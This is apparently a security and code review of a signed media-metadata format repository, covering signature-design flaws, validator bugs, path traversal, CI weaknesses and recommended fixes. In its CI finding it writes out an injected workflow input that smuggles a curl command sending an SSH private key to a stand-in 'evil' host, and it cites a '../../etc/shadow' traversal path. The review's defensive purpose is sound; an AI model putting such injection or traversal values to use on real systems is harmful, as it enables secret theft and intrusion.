# Hyper-critical review — DWC Metadata Interchange Format (v0.4.0)

_Review date: 2026-06-11 · Scope: full repo (validator, signers, ingestion paths, schemas, CI)_

## Verdict

The engineering is genuinely good: clean layering on OMC's `customData` extension point, a
disciplined nine-stage validator, JCS-canonical Ed25519 signing done with `cryptography` (no
hand-rolled crypto), a pluggable signer backend abstraction, C4 cross-verified against `pyc4`, and
an idempotent watch-folder service with collision handling. No `shell=True`, no `eval`,
`yaml.safe_load` throughout. As a *reference implementation of a file-referencing schema*, it works
and validates end-to-end.

The headline is uncomfortable: **the format does not yet deliver the security property it
advertises.** Its pitch is "carry cryptographic provenance above canonical files so a recipient can
detect tampering." A motivated adversary can today hand a recipient a sidecar that passes all nine
stages green while misrepresenting what happened to the clip. The signatures protect the
*narrative*, not the *integrity claims*, and the chain has no anchor. That's the thing to fix before
anyone relies on this in a real chain of custody.

---

## The core design flaw: what is signed ≠ what you think is signed

Five issues compound into one trust hole. Individually they're "medium"; together they mean the
green checkmark is not trustworthy from an untrusted sender.

1. **The artifact hashes — the actual integrity claims — are not signed by anything.** The signed
   events (`seq, ts, actor, tool, action, target, prevHash`) never contain the file hash of the
   clip/AMF/FDL they reference. The `dwc.sidecar.artifacts` block that carries those hashes sits
   entirely outside any signature. So an attacker swaps the camera file *and* edits its declared
   hash to match; Stage 6 re-hashes the new bytes against the new declared value and passes. Nothing
   cryptographic objects. The provenance log attests "a DIT created something" but not "*this* file
   is what they created."

2. **The log can be truncated to any valid prefix.** There's no signed commitment to chain length or
   head. Drop events 2–3 (including a `lock` or `supersede`) and the remaining `seq:1,
   prevHash:null` event verifies fine; Stage 3/4/5 all pass. A locked or superseded clip silently
   reappears as unlocked and current.

3. **Signed events aren't bound to the asset they live in.** No stage checks `event.target` against
   the parent Asset's identifiers (the example itself mixes two UUIDs in one log). An attacker lifts
   a genuinely-signed event array from clip A into a forged sidecar for clip B — all signatures
   still verify.

4. **Stage 4 fails open when `keyring.json` is missing** (`validate.py:174`). No keyring → Stage 4
   returns `pass`, 0 errors. A forged sidecar signed by the attacker's own key, shipped without a
   keyring to a recipient who hasn't pre-installed one, validates 9/9 green. Fail-open on the one
   security-critical stage is the wrong default.

5. **The lock record's signature is never verified** (`validate.py:254–288`). The schema demands
   `sig.value`, but Stage 5 only checks that the lock's `kid` equals the event's `kid` — the bytes
   are never decoded or verified. The shipped `example-clip.omc.json` proves it: its lock `sig.value`
   is the literal string `"BASE64..."` and `dwc validate` passes. Any consumer trusting
   `lock.sig.value` is trusting unverified data.

**To actually deliver tamper-evidence, the signed payload needs to commit to the integrity claims
and the chain needs an anchor.** Concretely: include each referenced artifact's `{alg,value}` hash
inside the signed `create`/`attach` event body (or sign the whole artifacts block); add a Stage 3.5
that binds `event.target` to an Asset `dwc:clip-uuid`; publish/commit the chain-head hash so
truncation is detectable; verify the lock signature for real (or delete `sig` from locks and
document that authority lives in the event); and make a missing keyring a `warn`/`--require-keyring`
failure, not a pass.

---

## Concrete bugs (ranked)

**Stage 3 crashes on `seq: null`** — `validate.py:147–157`. First event with null/absent `seq` sets
`prev_seq=None`; next iteration computes `None + 1` → uncaught `TypeError` that aborts the whole run
(no per-stage guard). Schema-invalid input reaches Stage 3 because stages are independent.

**Validator crashes on a timezone-naive `ts`** — `validate.py:225`. `_parse_iso` only rewrites a
trailing `Z`; a schema-valid `"2026-01-01T00:00:00"` (no offset) yields a naive datetime, and
`ts < vfrom` against an aware keyring datetime raises `TypeError`, killing validation before any
result (confirmed empirically). Fix: default `tzinfo=timezone.utc` in `_parse_iso`. A malicious
sidecar can use this to *abort* validation rather than fail it.

**`startswith` used for path containment across all three ingestion modules** — `mhl_walker.py:49`,
`batch.py:53`, `bootstrap.py:112,206`. `str(p).startswith(str(base))` is true for `/Volumes/Media`
vs base `/Volumes/M`, then `relative_to` raises `ValueError` and propagates — kills the current MHL
entry in `watch`, tracebacks in the CLI. Fix: `p.is_relative_to(base)`.

**`dwc sign-example` never re-signs `example-reel.omc.json`** — `sign_example.py:100`. It only
touches `example-clip.omc.json`, and even there only `Asset[0]`. After a key rotation (the
documented procedure) the reel's signatures are stale and `test_stub_reel_passes_all_stages` breaks
— git log shows this was patched by hand twice already. Make `sign-example` iterate every example
file and every Asset.

**Watch: already-processed MHLs are re-hashed every poll** — `watch.py:177`. `prev["processed_sha"]`
is written but never read, so the intended short-circuit doesn't exist; every stable MHL gets a full
SHA-256 each cycle. On a multi-thousand-MHL tree that's real recurring I/O.

**Watch CONFLICT resolver lets a third MHL reclaim the clean filename** — `watch.py:298`. After two
MHLs conflict (both suffixed), a third writes back to `stem.omc.json`, so the "clean" name silently
becomes a third disputed version with no marker. The 8-hex-prefix suffix can itself collide
(CLAUDE.md convention #3 warns about exactly this).

**Non-atomic writes** — `watch.py` writes sidecars and `.watch-state.json` with `write_text` (no
temp+rename); a crash mid-write corrupts state, and `_load_state` swallows the error and silently
resets the processed set → mass re-emit. The ALE path *does* do temp+`os.replace` correctly — apply
that pattern here.

**MHL v1 detection misses a UTF-8 BOM** — `mhl.py:65`. Windows DIT tools (ShotPut Pro) emit
BOM-prefixed XML; `lstrip()` doesn't remove `﻿`, so the file falls through to the YAML parser
and silently mis-parses.

**PKCS#11 session never auto-closed** — `pkcs11.py:80`. No `__del__`/context manager; HSM session
pools (YubiHSM, CloudHSM) leak across runs.

---

## Security flaws (ranked)

**Path traversal → arbitrary-file read/hash oracle (High)** — `validate.py:334,389,413`. Every
artifact path is `base_dir / attacker_string` with no containment check. `base_dir /
"../../etc/shadow"` resolves out of base; `path.exists()` is an existence oracle and the FAIL line
leaks the first 16 hex of the *actual* file hash, progressively disclosing content. Stage 8
compounds it (MHL `entry["File"]` is a second traversal). The CLI — the primary "receive an
untrusted sidecar and verify it" path — is fully exposed; only the Pyodide sandbox is safe. Add a
`_safe_path` helper that resolves and asserts containment at all six sites.

**Weak/broken default integrity hash (High)** — `bootstrap.py:69`, `batch.py:164` default
clip-integrity to `xxh64`, a 64-bit non-cryptographic hash with no adversarial-collision hardness;
`md5`/`sha1` are also selectable for integrity artifacts with no warning. For the foundational "the
camera original wasn't substituted" claim this is the wrong primitive. Default to `sha256`/`c4` and
warn when a weak alg is used on a `clip-integrity`/`integrity` artifact. (The *event* `chainHash` is
correctly restricted to sha256/sha512/blake3 — the artifact hashes should be too.)

**CI: `workflow_dispatch` shell injection (Medium)** — `homebrew-tap-bump.yml:34`. `${{ inputs.tag }}`
is interpolated straight into a `run:` block; a dispatch with
`tag: v1"; curl evil/$(cat ~/.ssh/id_rsa); echo "` runs in a job holding `HOMEBREW_TAP_TOKEN`
(verified). Pass inputs via `env:` and reference `"$INPUT_TAG"`.

**CI: third-party actions on mutable tags (Medium)** — `softprops/action-gh-release@v2`,
`cloudflare/wrangler-action@v3` (release jobs hold `contents: write`). Pin to full commit SHAs.

**Lower-severity, worth doing:** `keys.priv.json` written at umask default (`keygen.py:105`) — open
with `0o600` (post houses run shared Linux NAS/render nodes); PKCS#11 PIN and Vault token accepted
inline in `signers.json` (`pkcs11.py:73`, `vault.py:46`) — warn and steer to the `*_env` path; XML
parsed with stdlib `ElementTree` (safe on CPython 3.8+ by default, but add `defusedxml` or a
documented version contract for defence-in-depth).

**Verified clean:** subprocess is list-form everywhere (keychain backend included — no injection),
`yaml.safe_load` is correct, `verify_event` guards `sig.alg != "ed25519"` against algorithm
confusion, revocation correctly compares `event.ts > revokedAt` rather than wall-clock, and JCS
strips only `hash`/`sig` so the full event body is under signature.

---

## Format improvements — to make it more flexible and stronger

Beyond the trust fixes above:

- **Sign the artifact set, and put referenced hashes in the signed event.** Single highest-leverage
  change — it's what turns the log from "story" into "proof."
- **Anchor the chain.** A signed `head` record (top seq + tip hash) or a periodically published head
  digest makes truncation and rollback detectable. Consider a `supersede` that points back by hash
  so version lineage is itself tamper-evident.
- **Bind events to identity.** Stage 3.5 (`event.target` ∈ Asset identifiers) closes cross-sidecar
  replay cheaply.
- **Multi-signer / threshold locks.** Today a lock is one signature. A "lock requires DIT + Post"
  policy (m-of-n) is a common real production requirement and the schema could express it.
- **Counter-signatures / hand-off events.** A `transfer` action exists in the enum but isn't
  validated as a two-party signed hand-off; making it one would let the format actually prove
  chain-of-custody between facilities.
- **Tighten the schemas.** `chainHash` pattern `[0-9a-f]{64,128}` accepts any length 64–128 (a
  100-char value is neither sha256 nor sha512); Stage 5 timestamp equality should normalize `Z` vs
  `+00:00`. Stage 5's `_group_by_domain` flattens locks/events across *all* assets into one bag — a
  lock on asset A can be satisfied by an event on asset B. Isolate per-asset.
- **A canonical "verify a bundle" entry point** that takes the sidecar + keyring + files as one
  sealed unit and refuses to fail-open, separate from the dev-convenience CLI that resolves CWD
  files.

---

## Quick wins (trivial, high value)

`_parse_iso` tz-default (stops a DoS), Stage 3 `seq` guard (stops a crash), keyring-absent → `warn`
(closes fail-open), `is_relative_to` for the path checks, `0o600` on `keys.priv.json`, `env:`-pass
the CI input, SHA-pin the actions. None are large; together they remove every crash-the-validator
and most of the silent-pass surface.

---

## Test coverage gaps

- Stage 3 with `seq: null` / absent (the crash above).
- `_resolve_collision` CONFLICT path, clean-filename-reuse, and REFRESH path.
- `_rel()` / `relative_to()` with a base that is a string prefix of a sibling directory.
- `mhl.py` v1/v2 detection: BOM-prefixed file, unexpected XML root element.
- `watch.py` scan loop, stability detection, state persistence — the entire state machine is untested.
- `mhl_walker.py` and `batch.py` ingestion paths have no unit tests.
- Stage 6 `--trust-mhl` fast path.
- `sign_example.py` with more than one example file / multi-asset sidecar.

---

## Priority summary

| Priority | Item | Effort |
|---|---|---|
| P1 | Path-containment helper at all `base_dir / untrusted` sites (`validate.py`) | Small |
| P1 | `_parse_iso` naive/aware crash; Stage 3 `seq` guard | Trivial |
| P1 | Keyring-absent → `warn` / `--require-keyring` | Trivial |
| P2 | Sign artifact hashes inside the signed event (core trust fix) | Medium |
| P2 | Verify or remove `lock.sig.value` | Small |
| P2 | Default clip-integrity hash → `sha256`; warn on weak algs for integrity | Small |
| P3 | Chain-head anchor (truncation detection) | Medium (protocol) |
| P3 | Stage 3.5 event↔asset binding | Small |
| P3 | SHA-pin GitHub Actions | Small |
| P4 | `workflow_dispatch` shell injection fix | Trivial |
| P4 | `keys.priv.json` `0o600`; inline PIN/token warnings | Trivial |
| P5 | `sign-example` covers reel + all assets; watch perf + atomic writes; BOM detection; PKCS#11 session close | Small |
